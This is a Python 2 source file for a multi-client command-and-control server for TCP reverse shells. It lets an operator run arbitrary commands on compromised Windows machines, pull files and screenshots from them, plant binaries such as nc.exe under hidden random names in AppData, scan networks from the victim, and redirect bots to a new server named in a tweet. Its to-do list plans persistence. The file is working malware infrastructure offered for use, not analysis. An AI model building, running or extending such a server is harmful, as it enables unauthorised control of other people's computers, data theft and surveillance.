# Server C&C - Advanced TCP Reverse Shell
# ====================================

'''
# --------------------------------------------------------------------------------------------#
#                                          INFOS                                              #
# --------------------------------------------------------------------------------------------#

Infos
===================================
This script is a python C&C server.
It allow multi-client to connect.
The IP and Port are hard coded in connect() function.

How to run
==========
- Complete pre-requistes
- Change the IP address according to yours
- Run the script

Pre-requistes
=============
- Run on Linux
- Python2

Log changes
===========
- Add thread to handle multi client (up to 10)
- Add conn_handler() function

What to do next
===============
- Create a function for persistence and de-installation
- See a way to handle in a better way the bits received from bots
- See a way, when the server crash, for the client to reconnect
- See a way, to change dynamically extensions of files in download and upload functions

'''

'''
# --------------------------------------------------------------------------------------------#
#                                   IMPORTS and VARIABLES                                     #
# --------------------------------------------------------------------------------------------#
'''
# TCP reverse shell
import socket 
import os      # Needed for file operation
import sys

from thread import *

sessions = {}


'''
# --------------------------------------------------------------------------------------------#
#                                         FUNCTIONS                                           #
# --------------------------------------------------------------------------------------------#
'''

'''
Help function:

Possible enhanced: 
- 

'''
def help():
    print """
    Local shell commands
    ====================

    - start_srv     : Start the server and listen for connections
    - stop_srv      : Stop the server
    - sessions -l   : List sessions
    - sessions -i 1 : Select a session
    - help          : Print this help
    - clear         : Wipe the shell
    - exit          : Quit the program

    All Unix commands can be entered but: 
    cd, ssh, telnet and all interactives commands in general.


    Session Shell commands
    ======================

    - cd          : Change working directory on the target
    - download    : download*C:\Users\<username>\Desktop\doc.txt 
                    The file will be stored on the local machine in /root/Desktop/file_<ip>_<integer>.txt
    - upload      : upload*/root/windows-binaries/nc.exe
                    The file will be stored on the target in: C:\Users\<username>\Desktop\doc.txt
    - screenshot  : Take a screenshot on the target machine
    - search      : Search files base on extensions on the target machine. 
                    Ex: search C:[\][\]*.pdf (without the [])
    - scan        : Low level TCP scanner. Ex: scan 192.168.0.14:22,21,80,135,443,445,8080 
    - up_cc       : Update the C&C infos via twitter last tweet
    - help        : help
    - terminate   : terminate
    
    All windows commands can be entered but: 
    cls, telnet and all interactives commands in general.

    """

'''
download function :
- Create file holder to receive the file
- Send the command to the client
- then we receive data until we reach the end of the file (with tag 'DONE') or if we receive 'Unable to find out the file' from bots
- In both cases, we break the loop

Possible enhanced: 
- Dynamically change the test.png to other file extension based on user inputs.
'''
def download(conn,addr,count,command):
    count += 1
    if 'screenshot' in command:
        ext = 'jpg'
        filename = 'screenshot_' + addr[0] + '_' + str(count) + '.' + ext
        f = open('/root/Desktop/' + filename,'wb')
        conn.send(command)

    else :
        cmd_temp,ext = command.split('.')
        junk,filename_tmp = cmd_temp.split('*')
        filename = 'file_' + addr[0] + '_file_' + str(count) + '.' + ext
        f = open('/root/Desktop/' + filename,'wb')
        conn.send(command)
    
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Download completed. The file is saved in /root/Desktop/' + filename
            f.close()
            break
        f.write(bits)


'''
upload function:
- Send the command
- Verify if the file exist on local system, if not print error.
- If it exists, store 1024 bits of the file in variable 'packet' and while packet is not empty, send packet and read another 1024 bits.
- When packet is empty (means the whole file have been sent), send tag 'DONE' (to tell the other side this is the end of file) 
- Then we store the received data in variable 'bits'
- If we receive the tag 'RECEIVED' then print 'Download completed', otherwise print an error.

Possible enhanced: 
- 

'''
def upload(conn,command):
    upload,path = command.split('*')
    junk,ext = command.split('.')
    
    if os.path.exists(path):
        conn.send(command)        
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            conn.send(packet) 
            packet = f.read(1024)
        conn.send('DONE')
        bits = conn.recv(1024)
        if 'RECEIVED' in bits:
            print "[+] Upload completed. The file is saved in: C:\Users\<username>\AppData\Local\Microsoft\Windows\<rand[50-100]>." + ext
            f.close()
        else:
            print "[-] A problem occured during the file upload !"
    else:
        print "[-] Unable to find out the file on the local machine"


'''
screenshot function :
- Create file holder "/root/Desktop/screenshot.jpg" for received bytes
- then we receive data until we reach the end of the file (with tag 'DONE') or if we receive 'Unable to find out the file' from bots
- In both cases, we break the loop

Possible enhanced: 
- Make a single download function based on extension asked or whatever.
'''
'''
old screenshot function:

def screenshot(conn,command):
    conn.send(command)
    f = open('/root/Desktop/screenshot.jpg','wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Download completed. The screenshot is saved in /root/Desktop/screenshot.jpg'
            f.close()
            break
        f.write(bits)

'''
'''
Connect function:
- Create a socket and set options to make it reusable instantly
- Bind IP and port to socket
- Then start listen (up to 10 connections) and print 'Listening ...'
- While 1: accept connections and store infos in conn and addr, then print 'We got a connection ...' when a client connect
- Start a new thread for this connection and give the hand to conn_handler() function 
- If keyboardInterrupt, then print error and sys.exit(0)

Possible enhanced: 
- Need a try ?

'''
def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set socket options to be able to reuse a waiting for closing socket
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("192.168.4.18", 8080))
        session_id = 0
    except Exception as e:
        print '[!] Error: ' + str(e)
        sys.exit(0)

    try:
        s.listen(10)
        print '[+] Listening for incoming TCP connection on port 8080'
        
        while 1:
            conn, addr = s.accept()
            #sessions.append(addr)
            #sessions.append(conn)
            session_id += 1
            sessions[session_id] = [conn,addr]
            print '[+] We got a connection from: ', addr
            print '[!] New session list: ', sessions
            #start_new_thread(conn_handler,(conn,addr))
    except KeyboardInterrupt:
        print '[!] Server stopped. Clients will reconnect to a new C&C.'
        sys.exit(0)


'''
Connections handler function:
Function that handles bots connections
- While 1: Ask for user input command (if blank or spaces, ask input again)
- If command is in custom commands then execute the associated actions
- If not, send the command to the bot and print the result that we got back
- If keyboardInterrupt, then print 'session closed..' and close the connection

Possible enhanced: 
- Better manner to handle received bits and display it (unlimited until end of outputs).

'''
def session_handler(sess_id,conn,addr):
    count = 0
    os.system('clear')
    print ""
    print "Welcome on " + str(addr[0]) + " ! You're at home."
    print ""

    while True:
        # If type nothing or space, continue asking for shell input
        command = ''
        while not command or command.isspace():
            command = raw_input("shell_" + str(addr[0]) + " > ")

        if 'download' in command:
            download(conn,addr,count,command)

        elif 'test' in command:
            print addr
            print addr[0]

        elif 'screenshot' in command:
            count +=1
            download(conn,addr,count,command)

        elif 'cd' in command:
            conn.send(command)
            print conn.recv(1024)

        elif 'upload' in command:
            upload(conn,command)

        #elif 'screenshot' in command:
        #    screenshot(conn,command)

        elif 'search' in command:
            conn.send(command)
            print conn.recv(88096)

        elif 'scan' in command:
            conn.send(command)
            print conn.recv(88096)

        elif 'up_cc' in command:
            print "[+] The client %s will connect to the new C&C." % (str(addr))
            conn.send('up_cc')
            conn.close()
            
        elif 'terminate' in command:
            conn.send('terminate')
            conn.close()
            del sessions[sess_id]
            print '[!] New session list: ', sessions
            break

        elif 'help' in command:
            help()

        elif 'back' in command:
            os.system('clear')
            print "Return to local shell"
            break

        elif 'exit' in command:
            os.system('clear')
            print "Return to local shell"
            break
            
        else:
            conn.send(command)      # Send command
            print conn.recv(88096)   # Print the result that we got back

'''
                Idea to receive as much bits as necessary:
                while True:
                    bits = ''
                    bits += conn.recv(1024)
                    if bits.endswith('DONE'):
                        print bits
                '''

#        except StandardError:
#            conn.close()
#            print "[-] Client " + str(addr) + " disconnected !"
#            break
#        except KeyboardInterrupt:
#            print '[!] Session closed: ' + str(addr)
#            conn.close()



'''
# --------------------------------------------------------------------------------------------#
#                                         PROGRAM                                             #
# --------------------------------------------------------------------------------------------#
'''

'''
Main function:
- Call connect()

Possible enhanced: 
- See what's the better manner to start the code (__init__() ?)

'''
def main ():
    print "C&C status: stopped, to start it: start_srv"
    while 1:
        try:
            # If type nothing or space, continue asking for shell input
            command = ''
            while not command or command.isspace():
                command = raw_input("shell_local> ")

            if 'start_srv' in command:
                srv = start_new_thread(connect,())

            elif 'stop_srv' in command:
                #srv.exit()
                print "Not yet implemented"

            elif 'sessions -l' in command:
                if not sessions:
                    print "No session yet. Start the server and wait for connections..."
                else:
                    for sess in sessions:
                        print str(sess) + ': ' + sessions[sess][1][0]

            elif 'sessions -i' in command:
                if not sessions:
                    print "No session yet. Start the server and wait for connections..."
                else:
                    try:
                        sess_id = int(command[12:])
                        session_handler(sess_id,sessions[sess_id][0],sessions[sess_id][1])
                        #start_new_thread(session_handler,(sessions[1][0],sessions[1][1]))
                    except:
                        print "Session " + command[12:] + " does not exist !"

            elif 'help' in command:
                help()

            elif 'exit' in command:
                sys.exit(0)

            else:
                handle = os.popen(command)
                line = ' '
                while line:
                    line = handle.read()
                    print line
                handle.close()
        except KeyboardInterrupt:
            print """
Program shutting down..."""
            sys.exit(1)

main()
